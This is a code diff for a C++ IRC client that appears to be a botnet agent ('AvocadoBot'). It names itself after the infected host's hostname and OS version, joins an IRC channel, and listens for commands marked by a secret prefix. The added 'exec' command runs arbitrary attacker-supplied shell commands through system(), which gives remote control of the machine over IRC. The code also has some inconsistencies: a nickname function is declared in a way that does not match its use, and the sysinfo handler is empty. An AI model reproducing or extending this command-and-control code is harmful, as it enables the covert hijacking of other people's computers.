@@ -8,7 +8,12 @@
 #include "IRCManager.h"
 
 IRCManager::IRCManager() {
-	ircc = new IRCClient(CONFIG_IRC_SERVER, CONFIG_IRC_PORT);
+	ircc = new IRCClient("127.0.0.1", 6667);
+	ircc->setNickname("Bot");
+	std::string l = IRCManager::generateNick();
+	//IRCManager::generateNick();
+	ircc->joinChannel("#AvocadoBot");
+
 	connected = false;
 	hThread = 0;
 }
@@ -16,6 +21,17 @@ IRCManager::IRCManager() {
 IRCManager::~IRCManager() {
 	delete ircc;
 }
+
+std::string generateNick() {
+	std::stringstream nick;
+
+	nick << "[" << OSInfo::getHostname() << "]";
+	nick << "[" << OSInfo::getShortOSVersionName() << "]";
+
+	return nick.str();
+}
+
+char IRCManager::getIRCCommandPrefix() { return IRC_CommandPrefix; }
 
 bool IRCManager::isConnected() {
 	return connected;
@@ -27,11 +43,6 @@ void IRCManager::start() {
 		return;
 	}
 	hThread = this->startThread();
-	
-	ircc->joinChannel(CONFIG_IRC_CHANNEL);
-	
-	// Test connection
-	ircc->sendMessage(CONFIG_IRC_CHANNEL, "testmessage");
 }
 
 void IRCManager::stop() {
@@ -41,7 +52,6 @@ void IRCManager::stop() {
 }
 
 HANDLE IRCManager::startThread() {
-	HANDLE hThread;
 	hThread = (HANDLE)_beginthread(monitor, 0, this);
 	return hThread;
 }
@@ -62,34 +72,58 @@ void monitor(void* i) {
 		fflush(stdout);
 
 		// Handle data
-		parseData(ircc, data);
+		parseData(ircc, data, ((IRCManager*)i)->getIRCCommandPrefix());
 	}
 }
 
-void parseData(IRCClient* ircc, std::string data) {
-	// Secret prefix for commands
 
+// TODO: refactor into parseData for all data, parseCommand for commands
+void parseData(IRCClient* ircc, std::string data, char IRC_CommandPrefix) {
+	std::string prefix;
 	std::string command;
-	std::string args;
-	unsigned int stop = data.find_last_of(":");
+	std::string params;
+
+	unsigned int stop;
 	unsigned int size = data.size();
+
+	// Prefix
+	stop = data.find_first_of(" ");
+	prefix = data.substr(1, stop);
+
+	// Command
+	stop = data.find(" ", stop);
 	command = data.substr(stop +1, size -2);
-	command = command.substr(0, command.size() -2);
+	//command = command.substr(0, command.size() -2);
+
+	stop = command.find_first_of(" ");
+	if(stop != std::string::npos) {
+		params = command.substr(stop +1, command.size() -1);
+		command = command.substr(0, stop);
+	}
 	
-	if(command.at(0) != '!')
+	if(command.at(0) != IRC_CommandPrefix)
 		return;
 
 	// Remove special char
 	command = command.substr(1, command.size() -1);
 
-	if(command.compare("sysinfo") == 0) {
-		OSInfo* osi = new OSInfo();
-		ircc->sendMessage(CONFIG_IRC_CHANNEL, osi->sysInfoStr());
-		return;
-	}
-	/*
-	Add more commands here
-	*/
+	std::string result = "";
+	result = executeCommand(command, params);
+	if(!result.empty())
+		ircc->sendMessage(ircc->getIRCChannels()[0], result);
 
 	return;
+}
+
+
+std::string executeCommand(std::string command, std::string args) {
+	std::string result;
+	if(!command.compare("sysinfo")) {
+
+	}
+	if(!command.compare("exec")) {
+		system(args.c_str());
+		result = args;
+	}
+	return result;
 }
